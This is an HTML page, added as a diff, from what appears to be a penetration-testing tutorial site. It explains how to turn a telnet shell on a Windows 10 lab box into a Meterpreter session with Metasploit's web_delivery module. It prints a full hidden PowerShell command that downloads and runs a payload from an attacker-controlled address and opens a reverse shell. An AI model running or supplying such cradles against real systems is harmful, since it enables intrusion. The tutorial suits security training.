@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Escalating a Regular Shell to Meterpreter Shell</title>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+        <link href="https://fonts.googleapis.com/css2?family=Raleway&display=swap" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css2?family=Encode+Sans+SC&display=swap" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css?family=Lato:100,300,400,700,900" rel="stylesheet">
+        <link rel="stylesheet" type="text/css" href="../css/style.css">
+        <meta name="description" content="This tutorial demonstrates how to escalate a regular shell on a remote box to a meterpreter shell so that we could take advantage of meterpreter's built-in commands.">
+        <meta name="keywords" content="kali, linux, kali linux, msfconsole, meterpreter, metasploit framework, escalate privileges, elevate privileges, shell">
+        <meta name="author" content="0xma">
+    </head>
+    <body>
+        <header class="header">
+            <div class="text-box">
+                <h1 class="heading-primary">
+                    <span class="heading-primary-main">0xma</span>
+                    <span class="heading-primary-sub">Cyber Security Articles</span>
+                </h1>
+            </div>
+            <div class="nav_box">
+                <ul class="nav_ul">
+                    <li class="nav_li"><a href="https://twitter.com/0xmaCyberSec">About</a></li>
+                    <li class="nav_li"><a href="https://github.com/0xma/">GitHub</a></li>
+                    <li class="nav_li"><a href="index.html">Hacking Articles</a></li>
+                    <li class="nav_li"><a href="../index.html">Home</a></li>
+                </ul>    
+            </div>
+        </header>
+        <br>
+        <br>
+        <br>
+        <div class="container">
+            <div class="left_empty_space"></div>
+            <div class="center">
+                <p class="date">February 19, 2021</p>
+                <h1 class="heading">Escalate a Regular Shell to Meterpreter Shell</h1>
+                <p>In this tutorial we will see how to login to a Windows 10 machine using telnet and then run Metasploit against it to get a meterpreter shell. Now, this might be a rare situation in which we get access to a Windows 10 machine using telnet. However, this technique works no matter what kind of shell access you have to your target box.</p>
+                <p>So, first we telnet into the box and enter in our credentials.</p>
+                <img src="../img/escalate_regular_shell_to_meterpreter_shell/001.png" alt="Telnet to the target Windows box.">
+                <br>
+                <br>
+                <p>You can see that the regular Windows commands like <span class="command">cd</span> and <span class="command">dir</span> works.</p>
+                <img src="../img/escalate_regular_shell_to_meterpreter_shell/002.png" alt="Shell access to the target box.">
+                <br>
+                <br>
+                <p>We can use the "exploit/multi/script/web_delivery" module to generate a PowerShell command that we can run on the target to get a meterpreter shell. "show options" shows the different options available for this module.</p>
+                <img src="../img/escalate_regular_shell_to_meterpreter_shell/003.png" alt="Metasploit's exploit/multi/script/web_delivery module.">
+                <br>
+                <br>
+                <p><span class="command">set TARGET 2</span> means we want a PowerShell command to run on the box. There are three options: 0 &gt; Python (default), 1 &gt; PHP and 2 &gt; PowerShell. We set the interface on which we are listening for connection to the "tun0" interface with <span class="command">set LHOST tun0</span>. And then we run <span class="command">exploit</span> to generate the payload that we are going to use on the target.</p>
+                <img src="../img/escalate_regular_shell_to_meterpreter_shell/004.png" alt="PowerShell payload which is the output of the exploit/multi/script/web_delivery module.">
+                <br>
+                <br>
+                <p>The full command is <span class="command">powershell.exe -nop -w hidden -c $K=new-object net.webclient;$K.proxy=[Net.WebRequest]::GetSystemWebProxy();$K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $K.downloadstring('http://10.10.14.13:8080/EwJompov6HX');</span>. If the image is too small, open it in a new tab.</p>
+                <img src="../img/escalate_regular_shell_to_meterpreter_shell/005.png" alt="Full payload of the exploit/multi/script/web_delivery module.">
+                <br>
+                <br>
+                <p>Once we run the payload on the target, we get a reverse meterpreter shell. The <span class="command">sessions</span> command shows the available connections to our target. In this case we have only one session which has the ID of 1. It shows us the name of the box which is "ACCESS" and also the username of the shell which is "security". <span class="command">sessions -i 1</span> allows us to interact with session 1. And at the bottom we get the meterpreter prompt.</p>
+                <img src="../img/escalate_regular_shell_to_meterpreter_shell/006.png" alt="meterpreter access to the target box.">
+                <br>
+                <br>
+                <p>The <span class="command">sysinfo</span> command shows information about the target host. It shows the computer name, operating system, architecture, system language and meterpreter version (32-bit or 64-bit). And the <span class="command">getuid</span> command shows the user with which we are currently logged into the box.</p>
+                <img src="../img/escalate_regular_shell_to_meterpreter_shell/007.png" alt="Output of 'sysinfo' and 'getuid' commands.">
+                <br>
+                <br>
+                <br>
+                <br>
+                <br>
+            </div>
+            <div class="right_margin">
+                <div id="right_margin_widget">
+                    <div class="widget_title">Related Tutorials</div>
+                    <hr>
+                    <ul class="remove_bullet_points">
+                        <li class="style_bullet_points"><a href="../hacking/escalate_regular_shell_to_meterpreter_shell.html" class="widget_links">Escalate a Regular Shell to Meterpreter Shell</a></li>
+                        <li class="style_bullet_points"><a href="../hacking/reading_outlook_pst_files.html" class="widget_links">Reading Outlook Files in Terminal</a></li>
+                        <li class="style_bullet_points"><a href="../hacking/metasploit_privilege_escalation.html" class="widget_links">Escalating Privileges with Metasploit's Local Exploit Suggester</a></li>
+                        <li class="style_bullet_points"><a href="../hacking/simple_powershell_wget_script.html" class="widget_links">Simple wget PowerShell Script</a></li>
+                        <li class="style_bullet_points"><a href="../hacking/psexec_in_linux.html" class="widget_links">PsExec in Linux</a></li>
+                        <li class="style_bullet_points"><a href="../hacking/eternal_blue_metasploit.html" class="widget_links">Eternal Blue Exploitation with Metasploit</a></li>
+                        <li class="style_bullet_points"><a href="../hacking/exploit_eternalblue_with_custom_script_1.html" class="widget_links">Exploit EternalBlue with Custom Exploit - 1</a></li>
+                        <li class="style_bullet_points"><a href="../hacking/exploit_eternalblue_with_custom_script_2.html" class="widget_links">Exploit EternalBlue with Custom Exploit - 2</a></li>
+                        <li class="style_bullet_points"><a href="../hacking/local_privilege_escalation_on_linux_kernel.html" class="widget_links">Local Privilege Escalation on Linux Kernel < 4.4.0-116</a></li>
+                        <li class="style_bullet_points"><a href="../hacking/extract_firefox_profile_passwords.html" class="widget_links">Extract Passwords from Firefox Profile</a></li>
+                    </ul>
+                </div>
+                <div id="right_margin_widget">
+                    <div class="widget_title">Latest Tutorials</div>
+                    <hr>
+                    <ul class="remove_bullet_points">
+                        <li class="style_bullet_points"><a href="../hacking/escalate_privileges_via_pip.html" class="widget_links">Escalate Privileges via pip</a></li>
+                        <li class="style_bullet_points"><a href="../hacking/modifying_etc_passwd_file.html" class="widget_links">Escalate Privileges by Modifying the /etc/passwd File</a></li>
+                        <li class="style_bullet_points"><a href="../hacking/wpadmin_shell_upload.html" class="widget_links">wp_admin_shell_upload</a></li>
+                        <li class="style_bullet_points"><a href="../hacking/extract_passwords_with_lazagne.html" class="widget_links">Extract Passwords with LaZagne</a></li>
+                        <li class="style_bullet_points"><a href="../hacking/brute_force_windows_server_2016_medusa.html" class="widget_links">Bruteforce Windows Server SMB Credentials with Medusa</a></li>
+                        <li class="style_bullet_points"><a href="../hacking/brute_force_windows_server_2016_hydra.html" class="widget_links">Brute Force Windows Server SMB Credentials with Hydra</a></li>
+                        <li class="style_bullet_points"><a href="../hacking/brute_force_windows_server_2016_ncrack.html" class="widget_links">Brute Force Windows Server SMB Credentials with NCrack</a></li>
+                        <li class="style_bullet_points"><a href="../hacking/brute_force_windows_server_crackmapexec.html" class="widget_links">Brute Force Windows Server SMB Credentials with CrackMapExec</a></li>
+                        <li class="style_bullet_points"><a href="../hacking/brute_force_windows_server_metasploit.html" class="widget_links">Brute Force Windows Server SMB Credentials with Metasploit</a></li>
+                        <li class="style_bullet_points"><a href="../hacking/exploit_printnightmare.html" class="widget_links">Exploit PrintNightmare</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="right_empty_space"></div>
+        <footer>
+            <div class="footer">
+                <span class="copyright">Copyright &copy; 2022</span>
+            </div>
+        </footer>
+    </body>
+</html>
